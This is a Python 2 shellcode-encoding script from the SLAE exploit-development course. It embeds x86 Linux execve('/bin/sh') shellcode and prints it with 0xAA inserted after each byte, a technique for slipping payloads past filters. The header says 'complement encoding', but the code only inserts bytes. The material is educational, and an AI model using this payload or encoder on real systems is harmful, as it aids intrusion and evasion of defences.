#!/usr/bin/env python
#
# Script name		: not-encode.py
# Created following	: SLAE
# Description		: complement encoding
#
import sys
# python objdump2shellcode.py -d <binary> -f raw -b "\x00\xAA"
buf = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# output stored in here
encoded = ""
encoded2 = ""

for i in bytearray(buf):
	encoded += '\\x'
	encoded += '%02x' % i
	encoded += '\\x%02x' % 0xAA
	# encoded 
	encoded2 += '0x'
	encoded2 += '%02x,' %i
	encoded2 += '0x%02x,' %0xAA

print encoded
print encoded2
print "[>] Shellcode length : %d\n" % len(bytearray(buf))

